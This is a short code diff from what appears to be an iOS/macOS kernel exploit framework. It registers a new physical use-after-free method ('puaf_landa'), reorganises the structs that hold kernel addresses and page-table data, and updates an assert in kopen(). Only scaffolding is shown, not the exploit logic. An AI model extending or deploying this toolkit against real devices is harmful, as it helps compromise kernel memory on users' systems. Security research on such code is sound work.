@@ -21,6 +21,7 @@
 enum puaf_method {
     puaf_physpuppet,
     puaf_smith,
+    puaf_landa,
 };
 
 enum kread_method {
@@ -56,25 +57,11 @@ struct info {
         i32 pid;
         u64 tid;
         u64 vid;
-        bool ios;
-        char osversion[8];
         u64 maxfilesperproc;
+        char kern_version[512];
     } env;
     struct {
         u64 kernel_slide;
-        u64 gVirtBase;
-        u64 gPhysBase;
-        u64 gPhysSize;
-        struct {
-            u64 pa;
-            u64 va;
-        } ttbr[2];
-        struct ptov_table_entry {
-            u64 pa;
-            u64 va;
-            u64 len;
-        } ptov_table[8];
-
         u64 current_map;
         u64 current_pmap;
         u64 current_proc;
@@ -85,11 +72,22 @@ struct info {
         u64 kernel_pmap;
         u64 kernel_proc;
         u64 kernel_task;
-    } kernel;
+    } kaddr;
 };
 
 struct perf {
-    u64 kernelcache_index;
+    u64 gVirtBase;
+    u64 gPhysBase;
+    u64 gPhysSize;
+    struct {
+        u64 pa;
+        u64 va;
+    } ttbr[2];
+    struct ptov_table_entry {
+        u64 pa;
+        u64 va;
+        u64 len;
+    } ptov_table[8];
     struct {
         u64 kaddr;
         u64 paddr;
@@ -179,7 +177,7 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     const u64 puaf_pages_max = 2048;
     assert(puaf_pages >= puaf_pages_min);
     assert(puaf_pages <= puaf_pages_max);
-    assert(puaf_method <= puaf_smith);
+    assert(puaf_method <= puaf_landa);
     assert(kread_method <= kread_IOSurface);
     assert(kwrite_method <= kwrite_IOSurface);
 
